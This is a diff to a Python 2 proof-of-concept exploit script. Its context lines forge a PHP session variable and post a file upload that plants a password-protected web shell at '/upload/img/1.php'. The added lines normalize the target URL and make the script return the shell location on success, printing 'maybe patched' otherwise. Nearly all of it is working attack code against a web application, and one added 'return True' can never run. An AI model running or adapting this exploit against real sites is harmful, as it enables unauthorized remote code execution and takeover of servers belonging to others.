@@ -10,8 +10,16 @@ payload1 = {
 	'_SESSION[login_time]':'99999999999'
 	}
 
+def fixurl(url):
+	if url.startswith('http://') or url.startswith('https://'):
+		return url 
+	else:
+		url = 'http://'+url
+		return url
+
 def poc(url):
 	#获取session
+	url = fixurl(url)
 	t = urlparse.urlparse(url)
 	url1 = t.scheme+'://'+t.netloc+'/index.php'
 	s = requests.session()
@@ -36,7 +44,12 @@ def poc(url):
 	try:
 		res = s.post(url2,files=files,data=data,headers=headers,timeout=3)
 		#print res.content
-		print '[*]shell:'+url+'/upload/img/1.php [password:1]'
+		if res.status_code == 200:
+			return '[*]shell:'+url+'/upload/img/1.php [password:1]'
+			return True
+		else:
+			print 'maybe patched'
+			return False
 	except:
 		return False
 
